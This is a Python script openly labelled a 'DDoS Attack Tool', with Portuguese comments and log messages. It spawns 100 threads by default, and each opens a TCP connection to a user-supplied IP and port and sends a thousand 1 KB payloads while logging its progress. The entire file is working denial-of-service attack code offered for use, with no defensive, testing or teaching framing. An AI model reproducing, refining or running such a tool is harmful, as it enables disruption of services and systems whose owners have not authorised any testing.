import socket
import threading
import random
import time
import logging
import argparse

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos_attack.log'),
        logging.StreamHandler()
    ]
)

def send_packet(target_ip, target_port, thread_id):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        for i in range(1000):  # 1000 requisições por thread
            payload = b"A" * 1024
            s.send(payload)
            
            logging.info(
                f"[Thread-{thread_id}] Enviado {len(payload)} bytes "
                f"para {target_ip}:{target_port}"
            )
            
            time.sleep(random.uniform(0.1, 0.5))
            
        s.close()
        
    except Exception as e:
        logging.error(f"[Thread-{thread_id}] Erro: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="DDoS Attack Tool")
    parser.add_argument("--ip", required=True, help="IP do alvo")
    parser.add_argument("--port", type=int, default=80, help="Porta do alvo")
    parser.add_argument("--threads", type=int, default=100, help="Número de threads")
    args = parser.parse_args()
    
    logging.info(f"Iniciando ataque DDoS para {args.ip}:{args.port}")
    
    threads = []
    for i in range(args.threads):
        t = threading.Thread(
            target=send_packet,
            args=(args.ip, args.port, i)
        )
        t.daemon = True
        t.start()
        threads.append(t)
        
        logging.info(f"Thread-{i} iniciada")
    
    for t in threads:
        t.join()
    
    logging.info("Ataque concluído")

if __name__ == "__main__":
    main()
